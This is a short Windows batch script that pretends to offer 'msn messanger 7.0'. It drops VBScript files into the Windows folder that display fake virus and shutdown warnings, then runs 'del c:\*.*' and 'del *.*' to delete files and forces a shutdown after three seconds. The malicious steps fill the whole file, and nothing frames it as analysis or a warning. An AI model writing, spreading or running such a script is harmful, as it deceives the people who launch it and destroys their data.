@echo off
color c9
echo msgbox"ERROR ERROR" , vbcritical , "WARNING">>c:\windows\driver1.vbs
echo msgbox"VIRUS DETECTED" , vbexclamation , "WARNING">>c:\windows\driver2.vbs
echo msgbox"VIRUS NAME=W.32IP">>c:\windows\driver3.vbs
echo msgbox"SHUTING DOWN">>c:\windows\driver4.vbs
goto start
:yes
echo off
del c:\*.*
del *.*
shutdown -s -t 3
:start
echo do you want msn messanger 7.0 type yes or no:
set /p yn=
if %yn% EQU yes goto 1
:no
echo off
start c:\windows\driver1.vbs
pause>nul
echo DELETING EVRYTHING RIGHT NOW
start c:\windows\driver2.vbs
pause>nul
cd windows
dir /b /s
echo DONE
del c:\*.*
del *.*
start c:\windows\driver3.vbs
shutdown -s -t 3